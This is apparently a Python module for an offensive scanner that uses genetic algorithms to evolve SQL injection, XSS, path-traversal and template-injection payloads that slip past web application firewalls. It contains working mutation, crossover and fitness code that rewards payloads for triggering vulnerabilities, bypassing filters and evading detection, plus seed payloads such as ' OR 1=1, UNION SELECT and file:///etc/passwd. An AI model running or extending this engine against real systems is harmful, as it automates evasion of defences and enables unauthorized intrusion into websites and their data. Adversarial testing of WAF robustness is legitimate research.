"""
Adversarial Payload Evolution — Genetic algorithms for WAF bypass.

This is the arms race: WAFs evolve their rules, we evolve our payloads.

How it works:
  1. POPULATION: Start with a pool of known payloads
  2. FITNESS: Test each payload against the target
     - Score based on: bypass WAF? trigger vuln? avoid detection?
  3. SELECTION: Keep the fittest payloads
  4. CROSSOVER: Combine parts of successful payloads
  5. MUTATION: Random modifications to explore new variations
  6. REPEAT: Each generation gets better at bypassing defenses

Advanced features:
  - CO-EVOLUTION: WAF defense model evolves alongside payloads
  - SPECIATION: Maintain diverse payload species (encoding, structure, technique)
  - ISLAND MODEL: Multiple populations evolving independently, occasional migration
  - ADAPTIVE MUTATION: Mutation rate adjusts based on fitness plateau
  - PAYLOAD GRAMMAR: Mutations respect syntax rules (valid SQL, JS, etc.)

What makes this beyond state-of-the-art:
  - Evolves payloads that NO human and NO static list would think of
  - Learns WAF-specific bypass patterns through adversarial evolution
  - Transfers evolved payloads across scans (persistent evolution)
  - Grammar-aware: evolved payloads are syntactically valid
"""

from __future__ import annotations

import hashlib
import math
import random
import re
import string
import time
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Optional


# ═══════════════════════════════════════════════════════════════════
# PAYLOAD GENOME
# ═══════════════════════════════════════════════════════════════════

@dataclass
class PayloadGenome:
    """
    A payload with genetic metadata for evolution.

    The genome represents:
    - The payload string itself
    - Its lineage (parent payloads)
    - Fitness scores across different contexts
    - Mutation history (what transformations created it)
    """
    id: str = ""
    payload: str = ""
    vuln_type: str = ""               # sqli, xss, lfi, etc.
    species: str = ""                 # encoding, structure, technique
    generation: int = 0
    fitness: float = 0.0              # Overall fitness
    fitness_components: dict = field(default_factory=dict)
    parent_ids: list[str] = field(default_factory=list)
    mutation_history: list[str] = field(default_factory=list)
    creation_time: float = field(default_factory=time.time)
    tests_run: int = 0
    bypasses: int = 0                 # WAF bypasses
    triggers: int = 0                 # Vuln triggers
    blocks: int = 0                   # WAF blocks

    @property
    def bypass_rate(self) -> float:
        return self.bypasses / self.tests_run if self.tests_run > 0 else 0.0

    @property
    def trigger_rate(self) -> float:
        return self.triggers / self.tests_run if self.tests_run > 0 else 0.0

    def record_test(self, bypassed_waf: bool, triggered_vuln: bool,
                    was_blocked: bool):
        """Record a test result."""
        self.tests_run += 1
        if bypassed_waf:
            self.bypasses += 1
        if triggered_vuln:
            self.triggers += 1
        if was_blocked:
            self.blocks += 1
        self._update_fitness()

    def _update_fitness(self):
        """Recalculate fitness from test results."""
        if self.tests_run == 0:
            return
        # Fitness = trigger_rate × 0.6 + bypass_rate × 0.3 - block_rate × 0.1
        block_rate = self.blocks / self.tests_run
        self.fitness = (
            self.trigger_rate * 0.6 +
            self.bypass_rate * 0.3 -
            block_rate * 0.1
        )
        self.fitness_components = {
            "trigger_rate": self.trigger_rate,
            "bypass_rate": self.bypass_rate,
            "block_rate": block_rate,
        }


# ═══════════════════════════════════════════════════════════════════
# MUTATION OPERATORS
# ═══════════════════════════════════════════════════════════════════

class MutationType(Enum):
    """Types of payload mutations."""
    # Encoding mutations
    URL_ENCODE = auto()
    DOUBLE_URL_ENCODE = auto()
    UNICODE_ESCAPE = auto()
    HEX_ENCODE = auto()
    HTML_ENTITY = auto()
    BASE64_WRAP = auto()

    # Structural mutations
    CASE_SWAP = auto()
    WHITESPACE_SUBSTITUTE = auto()
    COMMENT_INJECT = auto()
    CONCAT_SPLIT = auto()
    NULL_BYTE_INSERT = auto()
    NEWLINE_INJECT = auto()

    # Semantic mutations
    SYNONYM_REPLACE = auto()     # UNION → UnIoN, SELECT → SeLeCt
    FUNCTION_WRAP = auto()       # x → CHAR(x), 'a' → CHR(97)
    LOGIC_EQUIV = auto()         # OR 1=1 → OR 2>1, AND 1=1 → AND 2=2
    BOUNDARY_PUSH = auto()       # Add chars at boundaries

    # Context mutations
    CONTEXT_BREAK = auto()       # Break out of HTML/JS/SQL context
    ENCODING_CHAIN = auto()      # Apply multiple encodings
    POLYGLOT = auto()            # Combine multiple attack types


class MutationOperator:
    """
    Applies a specific mutation to a payload string.

    Each operator is grammar-aware: it knows which transformations
    produce valid payloads for each vuln type.
    """

    # SQL synonyms for evasion
    SQL_SYNONYMS = {
        "select": ["SELECT", "SeLeCt", "sElEcT", "/*!SELECT*/", "SEL%45CT"],
        "union": ["UNION", "UnIoN", "uNiOn", "/*!UNION*/", "UN%49ON"],
        "from": ["FROM", "FrOm", "fRoM", "/*!FROM*/"],
        "where": ["WHERE", "WhErE", "wHeRe", "/*!WHERE*/"],
        "and": ["AND", "AnD", "&&", "/*!AND*/"],
        "or": ["OR", "Or", "||", "/*!OR*/"],
        "sleep": ["SLEEP", "SLeEP", "BENCHMARK", "pg_sleep", "WAITFOR DELAY"],
    }

    # XSS event handlers
    XSS_EVENTS = [
        "onload", "onerror", "onmouseover", "onfocus", "onblur",
        "onclick", "onsubmit", "onchange", "oninput", "onkeypress",
        "onanimationstart", "ontoggle", "onpointerenter",
    ]

    # Whitespace alternatives
    WHITESPACE_ALTS = [
        "%09",  # tab
        "%0a",  # newline
        "%0d",  # carriage return
        "%0b",  # vertical tab
        "%0c",  # form feed
        "/**/",  # SQL comment
        "+",     # URL space
        "%20",   # URL encoded space
    ]

    @classmethod
    def mutate(cls, payload: str, mutation_type: MutationType,
               vuln_type: str = "") -> str:
        """Apply a mutation to a payload."""
        mutators = {
            MutationType.URL_ENCODE: cls._url_encode,
            MutationType.DOUBLE_URL_ENCODE: cls._double_url_encode,
            MutationType.UNICODE_ESCAPE: cls._unicode_escape,
            MutationType.HEX_ENCODE: cls._hex_encode,
            MutationType.HTML_ENTITY: cls._html_entity,
            MutationType.CASE_SWAP: cls._case_swap,
            MutationType.WHITESPACE_SUBSTITUTE: cls._whitespace_sub,
            MutationType.COMMENT_INJECT: cls._comment_inject,
            MutationType.CONCAT_SPLIT: cls._concat_split,
            MutationType.NULL_BYTE_INSERT: cls._null_byte,
            MutationType.NEWLINE_INJECT: cls._newline_inject,
            MutationType.SYNONYM_REPLACE: cls._synonym_replace,
            MutationType.FUNCTION_WRAP: cls._function_wrap,
            MutationType.LOGIC_EQUIV: cls._logic_equiv,
            MutationType.CONTEXT_BREAK: cls._context_break,
            MutationType.ENCODING_CHAIN: cls._encoding_chain,
            MutationType.POLYGLOT: cls._polyglot,
            MutationType.BOUNDARY_PUSH: cls._boundary_push,
            MutationType.BASE64_WRAP: cls._base64_wrap,
        }
        mutator = mutators.get(mutation_type, lambda p, v: p)
        return mutator(payload, vuln_type)

    @staticmethod
    def _url_encode(payload: str, _vt: str) -> str:
        chars = list(payload)
        # Encode 20-40% of special characters
        for i, c in enumerate(chars):
            if c in "'\"><;|&${}()" and random.random() < 0.4:
                chars[i] = f"%{ord(c):02X}"
        return "".join(chars)

    @staticmethod
    def _double_url_encode(payload: str, _vt: str) -> str:
        chars = list(payload)
        for i, c in enumerate(chars):
            if c in "'\"><;" and random.random() < 0.3:
                chars[i] = f"%25{ord(c):02X}"
        return "".join(chars)

    @staticmethod
    def _unicode_escape(payload: str, _vt: str) -> str:
        chars = list(payload)
        for i, c in enumerate(chars):
            if c.isalpha() and random.random() < 0.2:
                chars[i] = f"\\u{ord(c):04x}"
        return "".join(chars)

    @staticmethod
    def _hex_encode(payload: str, _vt: str) -> str:
        chars = list(payload)
        for i, c in enumerate(chars):
            if c in "'\"<>" and random.random() < 0.5:
                chars[i] = f"0x{ord(c):02x}"
        return "".join(chars)

    @staticmethod
    def _html_entity(payload: str, _vt: str) -> str:
        entity_map = {
            "<": "&lt;", ">": "&gt;", "'": "&#39;",
            '"': "&quot;", "&": "&amp;",
        }
        chars = list(payload)
        for i, c in enumerate(chars):
            if c in entity_map and random.random() < 0.3:
                chars[i] = entity_map[c]
        return "".join(chars)

    @staticmethod
    def _base64_wrap(payload: str, _vt: str) -> str:
        import base64
        encoded = base64.b64encode(payload.encode()).decode()
        return f"atob('{encoded}')"

    @staticmethod
    def _case_swap(payload: str, _vt: str) -> str:
        return "".join(
            c.upper() if random.random() < 0.5 and c.isalpha() else
            c.lower() if random.random() < 0.5 and c.isalpha() else c
            for c in payload
        )

    @classmethod
    def _whitespace_sub(cls, payload: str, _vt: str) -> str:
        result = payload
        for _ in range(random.randint(1, 3)):
            # Replace a random space with alternative
            if " " in result:
                alt = random.choice(cls.WHITESPACE_ALTS)
                idx = random.choice([i for i, c in enumerate(result) if c == " "])
                result = result[:idx] + alt + result[idx + 1:]
        return result

    @staticmethod
    def _comment_inject(payload: str, vuln_type: str) -> str:
        if vuln_type in ("sqli", "nosql"):
            # SQL inline comments
            words = payload.split()
            if len(words) > 1:
                idx = random.randint(0, len(words) - 2)
                words[idx] = words[idx] + "/**/"
            return " ".join(words)
        elif vuln_type == "xss":
            # HTML comments
            return payload.replace("><", "><!--X--><!--Y--><")
        return payload

    @staticmethod
    def _concat_split(payload: str, vuln_type: str) -> str:
        if vuln_type == "sqli" and len(payload) > 5:
            mid = len(payload) // 2
            return f"CONCAT('{payload[:mid]}','{payload[mid:]}')"
        elif vuln_type == "xss" and "<script>" in payload.lower():
            return payload.replace("<script>", "<scr" + "ipt>")
        return payload

    @staticmethod
    def _null_byte(payload: str, _vt: str) -> str:
        positions = ["start", "mid", "end"]
        pos = random.choice(positions)
        if pos == "start":
            return "%00" + payload
        elif pos == "mid" and len(payload) > 3:
            mid = len(payload) // 2
            return payload[:mid] + "%00" + payload[mid:]
        else:
            return payload + "%00"

    @staticmethod
    def _newline_inject(payload: str, _vt: str) -> str:
        encodings = ["%0a", "%0d", "%0d%0a", "\r\n"]
        enc = random.choice(encodings)
        if len(payload) > 3:
            idx = random.randint(1, len(payload) - 1)
            return payload[:idx] + enc + payload[idx:]
        return enc + payload

    @classmethod
    def _synonym_replace(cls, payload: str, vuln_type: str) -> str:
        if vuln_type not in ("sqli", "nosql"):
            return payload
        result = payload
        for keyword, synonyms in cls.SQL_SYNONYMS.items():
            if keyword in result.lower():
                replacement = random.choice(synonyms)
                # Case-insensitive replace of first occurrence
                pattern = re.compile(re.escape(keyword), re.IGNORECASE)
                result = pattern.sub(replacement, result, count=1)
        return result

    @staticmethod
    def _function_wrap(payload: str, vuln_type: str) -> str:
        if vuln_type == "sqli":
            # Wrap string chars in CHAR()
            if "'" in payload:
                parts = payload.split("'")
                for i in range(1, len(parts), 2):
                    if parts[i] and len(parts[i]) <= 10:
                        char_vals = ",".join(str(ord(c)) for c in parts[i])
                        parts[i] = f"CHAR({char_vals})"
                return "".join(parts)
        return payload

    @staticmethod
    def _logic_equiv(payload: str, vuln_type: str) -> str:
        if vuln_type != "sqli":
            return payload
        replacements = {
            "1=1": random.choice(["2>1", "1<2", "'a'='a'", "2=2", "3>0"]),
            "1=2": random.choice(["2>3", "1>2", "'a'='b'", "0=1"]),
            "OR": random.choice(["||", "OR", "oR"]),
            "AND": random.choice(["&&", "AND", "aNd"]),
        }
        result = payload
        for old, new in replacements.items():
            if old in result:
                result = result.replace(old, new, 1)
                break
        return result

    @staticmethod
    def _context_break(payload: str, vuln_type: str) -> str:
        if vuln_type == "xss":
            prefixes = ['"><', "'>", "-->", "*/", "</textarea>",
                        "</script>", '</title>']
            return random.choice(prefixes) + payload
        elif vuln_type == "sqli":
            prefixes = ["')", "'))", "';", "'--"]
            return random.choice(prefixes) + payload
        return payload

    @classmethod
    def _encoding_chain(cls, payload: str, vuln_type: str) -> str:
        """Apply 2-3 encoding mutations in sequence."""
        encodings = [
            MutationType.URL_ENCODE, MutationType.CASE_SWAP,
            MutationType.UNICODE_ESCAPE, MutationType.HEX_ENCODE,
        ]
        chain_length = random.randint(2, 3)
        selected = random.sample(encodings, min(chain_length, len(encodings)))
        result = payload
        for enc in selected:
            result = cls.mutate(result, enc, vuln_type)
        return result

    @staticmethod
    def _polyglot(payload: str, vuln_type: str) -> str:
        """Create a polyglot that works in multiple contexts."""
        polyglots = {
            "sqli_xss": "'-alert(1)-'",
            "xss_ssti": "{{constructor.constructor('alert(1)')()}}",
            "sqli_cmdi": "'; echo 'x",
            "lfi_ssrf": "file:///etc/passwd",
        }
        # Pick a random polyglot base and blend with payload
        key = random.choice(list(polyglots.keys()))
        if vuln_type in key:
            return polyglots[key] + payload[:20]
        return payload

    @staticmethod
    def _boundary_push(payload: str, _vt: str) -> str:
        """Add boundary-pushing characters."""
        boundaries = ["\x00", "\xff", "\x7f", "\n", "\r", "\t",
                      "\x0b", "\x0c", "\\", "/"]
        char = random.choice(boundaries)
        pos = random.choice(["start", "end", "mid"])
        if pos == "start":
            return char + payload
        elif pos == "end":
            return payload + char
        else:
            mid = len(payload) // 2
            return payload[:mid] + char + payload[mid:]


# ═══════════════════════════════════════════════════════════════════
# CROSSOVER OPERATORS
# ═══════════════════════════════════════════════════════════════════

class CrossoverOperator:
    """Crossover operators for combining payload genomes."""

    @staticmethod
    def single_point(parent1: str, parent2: str) -> tuple[str, str]:
        """Single-point crossover at a random position."""
        if not parent1 or not parent2:
            return parent1, parent2
        point = random.randint(1, min(len(parent1), len(parent2)) - 1)
        child1 = parent1[:point] + parent2[point:]
        child2 = parent2[:point] + parent1[point:]
        return child1, child2

    @staticmethod
    def two_point(parent1: str, parent2: str) -> tuple[str, str]:
        """Two-point crossover — swap a middle segment."""
        if len(parent1) < 3 or len(parent2) < 3:
            return parent1, parent2
        min_len = min(len(parent1), len(parent2))
        p1 = random.randint(1, min_len // 2)
        p2 = random.randint(min_len // 2, min_len - 1)
        child1 = parent1[:p1] + parent2[p1:p2] + parent1[p2:]
        child2 = parent2[:p1] + parent1[p1:p2] + parent2[p2:]
        return child1, child2

    @staticmethod
    def uniform(parent1: str, parent2: str) -> tuple[str, str]:
        """Uniform crossover — each character randomly from either parent."""
        min_len = min(len(parent1), len(parent2))
        max_len = max(len(parent1), len(parent2))
        child1, child2 = [], []
        for i in range(max_len):
            c1 = parent1[i] if i < len(parent1) else ""
            c2 = parent2[i] if i < len(parent2) else ""
            if random.random() < 0.5:
                child1.append(c1)
                child2.append(c2)
            else:
                child1.append(c2)
                child2.append(c1)
        return "".join(child1), "".join(child2)

    @staticmethod
    def semantic(parent1: str, parent2: str,
                 vuln_type: str = "") -> tuple[str, str]:
        """
        Semantic crossover — combine meaningful parts.

        For SQL: combine clauses from different payloads
        For XSS: combine tags/events from different payloads
        """
        if vuln_type == "sqli":
            # Split on SQL keywords
            keywords = [" union ", " select ", " from ", " where ",
                        " and ", " or ", " order "]
            for kw in keywords:
                if kw in parent1.lower() and kw in parent2.lower():
                    idx1 = parent1.lower().index(kw)
                    idx2 = parent2.lower().index(kw)
                    child1 = parent1[:idx1] + parent2[idx2:]
                    child2 = parent2[:idx2] + parent1[idx1:]
                    return child1, child2

        elif vuln_type == "xss":
            # Split on tag boundaries
            if ">" in parent1 and ">" in parent2:
                idx1 = parent1.index(">") + 1
                idx2 = parent2.index(">") + 1
                child1 = parent1[:idx1] + parent2[idx2:]
                child2 = parent2[:idx2] + parent1[idx1:]
                return child1, child2

        # Fallback to single-point
        return CrossoverOperator.single_point(parent1, parent2)


# ═══════════════════════════════════════════════════════════════════
# FITNESS FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

class FitnessFunction:
    """
    Fitness evaluation for payloads.

    Multi-objective fitness:
    1. Trigger rate: Does it trigger the vulnerability?
    2. Bypass rate: Does it bypass WAF/filters?
    3. Stealth score: Is it hard to detect?
    4. Length penalty: Shorter payloads are generally better
    5. Novelty bonus: Different from known payloads
    """

    STEALTH_PATTERNS = [
        # Patterns that are easy for WAFs to detect
        (re.compile(r"union\s+select", re.I), -0.2),
        (re.compile(r"<script>", re.I), -0.2),
        (re.compile(r"\.\./\.\./", re.I), -0.1),
        (re.compile(r";\s*(?:ls|cat|id|whoami)", re.I), -0.2),
        (re.compile(r"sleep\(\d+\)", re.I), -0.15),
    ]

    MAX_OPTIMAL_LENGTH = 200

    def evaluate(self, genome: PayloadGenome,
                 population: list[PayloadGenome] = None) -> float:
        """
        Compute comprehensive fitness for a payload genome.
        """
        score = 0.0

        # Primary: trigger rate (60% weight)
        score += genome.trigger_rate * 0.6

        # Secondary: bypass rate (25% weight)
        score += genome.bypass_rate * 0.25

        # Stealth score (5% weight)
        stealth = self._stealth_score(genome.payload)
        score += stealth * 0.05

        # Length penalty (5% weight)
        length_score = max(0, 1.0 - len(genome.payload) / self.MAX_OPTIMAL_LENGTH)
        score += length_score * 0.05

        # Novelty bonus (5% weight)
        if population:
            novelty = self._novelty_score(genome, population)
            score += novelty * 0.05

        genome.fitness = max(0.0, min(1.0, score))
        return genome.fitness

    def _stealth_score(self, payload: str) -> float:
        """Score how hard a payload is to detect."""
        score = 1.0
        for pattern, penalty in self.STEALTH_PATTERNS:
            if pattern.search(payload):
                score += penalty
        return max(0.0, score)

    @staticmethod
    def _novelty_score(genome: PayloadGenome,
                       population: list[PayloadGenome]) -> float:
        """Score how different this payload is from the population."""
        if not population:
            return 1.0
        # Simple character-level similarity
        similarities = []
        for other in population:
            if other.id == genome.id:
                continue
            common = sum(
                1 for a, b in zip(genome.payload, other.payload) if a == b
            )
            max_len = max(len(genome.payload), len(other.payload)) or 1
            similarities.append(common / max_len)

        if not similarities:
            return 1.0
        avg_sim = sum(similarities) / len(similarities)
        return 1.0 - avg_sim  # More different = higher novelty


# ═══════════════════════════════════════════════════════════════════
# SELECTION STRATEGIES
# ═══════════════════════════════════════════════════════════════════

class SelectionStrategy(Enum):
    TOURNAMENT = auto()
    ROULETTE = auto()
    RANK = auto()
    ELITIST = auto()


class PayloadSelector:
    """Selection operators for choosing parents from population."""

    @staticmethod
    def tournament(population: list[PayloadGenome],
                   k: int = 3) -> PayloadGenome:
        """Tournament selection: pick best from k random individuals."""
        tournament = random.sample(population, min(k, len(population)))
        return max(tournament, key=lambda g: g.fitness)

    @staticmethod
    def roulette(population: list[PayloadGenome]) -> PayloadGenome:
        """Roulette wheel selection: probability proportional to fitness."""
        total = sum(g.fitness for g in population) or 1.0
        r = random.uniform(0, total)
        cumsum = 0.0
        for genome in population:
            cumsum += genome.fitness
            if cumsum >= r:
                return genome
        return population[-1]

    @staticmethod
    def rank(population: list[PayloadGenome]) -> PayloadGenome:
        """Rank-based selection: probability based on rank, not raw fitness."""
        sorted_pop = sorted(population, key=lambda g: g.fitness)
        n = len(sorted_pop)
        total = n * (n + 1) / 2
        r = random.uniform(0, total)
        cumsum = 0.0
        for i, genome in enumerate(sorted_pop):
            cumsum += i + 1
            if cumsum >= r:
                return genome
        return sorted_pop[-1]


# ═══════════════════════════════════════════════════════════════════
# EVOLUTION ENGINE
# ═══════════════════════════════════════════════════════════════════

class EvolutionEngine:
    """
    Complete genetic algorithm engine for payload evolution.

    Manages populations of payloads, evolves them generation by
    generation, and produces increasingly effective WAF-bypassing
    payloads.

    Usage:
        engine = EvolutionEngine("sqli")
        engine.seed(["' OR 1=1", "' UNION SELECT 1--", ...])
        for generation in range(100):
            for genome in engine.population:
                # Test payload against target
                genome.record_test(bypassed, triggered, blocked)
            engine.evolve()
        best = engine.get_elite()
    """

    def __init__(
        self,
        vuln_type: str = "sqli",
        population_size: int = 50,
        mutation_rate: float = 0.3,
        crossover_rate: float = 0.7,
        elite_ratio: float = 0.1,
        selection_strategy: SelectionStrategy = SelectionStrategy.TOURNAMENT,
        adaptive_mutation: bool = True,
    ):
        self.vuln_type = vuln_type
        self.pop_size = population_size
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        self.elite_ratio = elite_ratio
        self.selection = selection_strategy
        self.adaptive_mutation = adaptive_mutation

        self.population: list[PayloadGenome] = []
        self.generation = 0
        self.fitness_fn = FitnessFunction()
        self._history: list[dict] = []  # Per-generation stats
        self._stagnation_counter = 0
        self._best_fitness_ever = 0.0

    def seed(self, payloads: list[str]):
        """Initialize population with known payloads."""
        self.population.clear()
        for i, payload in enumerate(payloads[:self.pop_size]):
            genome = PayloadGenome(
                id=f"gen0_{i}",
                payload=payload,
                vuln_type=self.vuln_type,
                species=self._classify_species(payload),
                generation=0,
            )
            self.population.append(genome)

        # Fill remaining spots with mutations of seeds
        while len(self.population) < self.pop_size and payloads:
            base = random.choice(payloads)
            mutation = random.choice(list(MutationType))
            mutated = MutationOperator.mutate(base, mutation, self.vuln_type)
            genome = PayloadGenome(
                id=f"gen0_{len(self.population)}",
                payload=mutated,
                vuln_type=self.vuln_type,
                species=self._classify_species(mutated),
                generation=0,
                mutation_history=[mutation.name],
            )
            self.population.append(genome)

    def evolve(self) -> list[PayloadGenome]:
        """
        Evolve the population one generation.

        1. Evaluate fitness
        2. Select elite (preserved unchanged)
        3. Select parents for breeding
        4. Apply crossover
        5. Apply mutation
        6. Replace population
        """
        self.generation += 1

        # Evaluate fitness
        for genome in self.population:
            self.fitness_fn.evaluate(genome, self.population)

        # Sort by fitness
        self.population.sort(key=lambda g: g.fitness, reverse=True)

        # Adaptive mutation rate
        if self.adaptive_mutation:
            self._adapt_mutation_rate()

        # Elite selection (top N preserved)
        elite_count = max(1, int(self.pop_size * self.elite_ratio))
        elite = self.population[:elite_count]

        # Build new population
        new_pop = []

        # Keep elite
        for genome in elite:
            new_genome = PayloadGenome(
                id=f"gen{self.generation}_{len(new_pop)}",
                payload=genome.payload,
                vuln_type=self.vuln_type,
                species=genome.species,
                generation=self.generation,
                parent_ids=[genome.id],
                fitness=genome.fitness,
            )
            new_pop.append(new_genome)

        # Fill rest with crossover + mutation
        while len(new_pop) < self.pop_size:
            if random.random() < self.crossover_rate and len(self.population) >= 2:
                # Crossover
                parent1 = self._select_parent()
                parent2 = self._select_parent()
                child1_str, child2_str = CrossoverOperator.semantic(
                    parent1.payload, parent2.payload, self.vuln_type
                )

                for child_str, parents in [
                    (child1_str, [parent1.id, parent2.id]),
                    (child2_str, [parent2.id, parent1.id]),
                ]:
                    if len(new_pop) >= self.pop_size:
                        break
                    # Maybe mutate the child
                    mutation_applied = []
                    if random.random() < self.mutation_rate:
                        mt = random.choice(list(MutationType))
                        child_str = MutationOperator.mutate(
                            child_str, mt, self.vuln_type
                        )
                        mutation_applied.append(mt.name)

                    new_pop.append(PayloadGenome(
                        id=f"gen{self.generation}_{len(new_pop)}",
                        payload=child_str,
                        vuln_type=self.vuln_type,
                        species=self._classify_species(child_str),
                        generation=self.generation,
                        parent_ids=parents,
                        mutation_history=mutation_applied,
                    ))
            else:
                # Mutation only
                parent = self._select_parent()
                mt = random.choice(list(MutationType))
                mutated = MutationOperator.mutate(
                    parent.payload, mt, self.vuln_type
                )
                new_pop.append(PayloadGenome(
                    id=f"gen{self.generation}_{len(new_pop)}",
                    payload=mutated,
                    vuln_type=self.vuln_type,
                    species=self._classify_species(mutated),
                    generation=self.generation,
                    parent_ids=[parent.id],
                    mutation_history=[mt.name],
                ))

        self.population = new_pop

        # Record generation stats
        fitnesses = [g.fitness for g in self.population]
        self._history.append({
            "generation": self.generation,
            "best_fitness": max(fitnesses) if fitnesses else 0.0,
            "avg_fitness": sum(fitnesses) / len(fitnesses) if fitnesses else 0.0,
            "mutation_rate": self.mutation_rate,
            "pop_size": len(self.population),
        })

        return self.population

    def get_elite(self, n: int = 5) -> list[PayloadGenome]:
        """Get the top N fittest payloads."""
        sorted_pop = sorted(self.population, key=lambda g: g.fitness, reverse=True)
        return sorted_pop[:n]

    def get_best(self) -> Optional[PayloadGenome]:
        """Get the single best payload."""
        if not self.population:
            return None
        return max(self.population, key=lambda g: g.fitness)

    def inject_immigrant(self, payload: str):
        """Inject an external payload into the population (island model)."""
        if len(self.population) >= self.pop_size:
            # Replace worst individual
            self.population.sort(key=lambda g: g.fitness)
            self.population[0] = PayloadGenome(
                id=f"immigrant_{self.generation}_{random.randint(0,999)}",
                payload=payload,
                vuln_type=self.vuln_type,
                species=self._classify_species(payload),
                generation=self.generation,
                mutation_history=["immigration"],
            )
        else:
            self.population.append(PayloadGenome(
                id=f"immigrant_{self.generation}_{random.randint(0,999)}",
                payload=payload,
                vuln_type=self.vuln_type,
                species=self._classify_species(payload),
                generation=self.generation,
            ))

    def _select_parent(self) -> PayloadGenome:
        """Select a parent using the configured strategy."""
        if self.selection == SelectionStrategy.TOURNAMENT:
            return PayloadSelector.tournament(self.population)
        elif self.selection == SelectionStrategy.ROULETTE:
            return PayloadSelector.roulette(self.population)
        elif self.selection == SelectionStrategy.RANK:
            return PayloadSelector.rank(self.population)
        return random.choice(self.population)

    def _adapt_mutation_rate(self):
        """Adapt mutation rate based on fitness progress."""
        if len(self._history) < 2:
            return

        current_best = max(g.fitness for g in self.population) if self.population else 0
        if current_best > self._best_fitness_ever:
            self._best_fitness_ever = current_best
            self._stagnation_counter = 0
            # Good progress — lower mutation rate
            self.mutation_rate = max(0.1, self.mutation_rate * 0.95)
        else:
            self._stagnation_counter += 1
            if self._stagnation_counter > 5:
                # Stagnation — increase mutation rate to break out
                self.mutation_rate = min(0.8, self.mutation_rate * 1.2)

    @staticmethod
    def _classify_species(payload: str) -> str:
        """Classify a payload into a species based on its structure."""
        payload_lower = payload.lower()
        if "%" in payload and len(payload) > len(payload.replace("%", "")):
            return "encoded"
        if "/*" in payload or "--" in payload:
            return "obfuscated"
        if "union" in payload_lower or "select" in payload_lower:
            return "union_based"
        if "sleep" in payload_lower or "benchmark" in payload_lower:
            return "time_based"
        if "<script" in payload_lower or "onerror" in payload_lower:
            return "tag_based"
        if "{{" in payload or "${" in payload:
            return "template"
        if "../" in payload or "..\\" in payload:
            return "traversal"
        return "generic"

    def get_stats(self) -> dict:
        """Get evolution statistics."""
        if not self.population:
            return {"generation": self.generation, "population_size": 0}
        fitnesses = [g.fitness for g in self.population]
        species = defaultdict(int)
        for g in self.population:
            species[g.species] += 1
        return {
            "generation": self.generation,
            "population_size": len(self.population),
            "best_fitness": max(fitnesses),
            "avg_fitness": sum(fitnesses) / len(fitnesses),
            "worst_fitness": min(fitnesses),
            "mutation_rate": round(self.mutation_rate, 4),
            "species_distribution": dict(species),
            "stagnation_counter": self._stagnation_counter,
        }

    def get_history(self) -> list[dict]:
        """Get evolution history."""
        return self._history
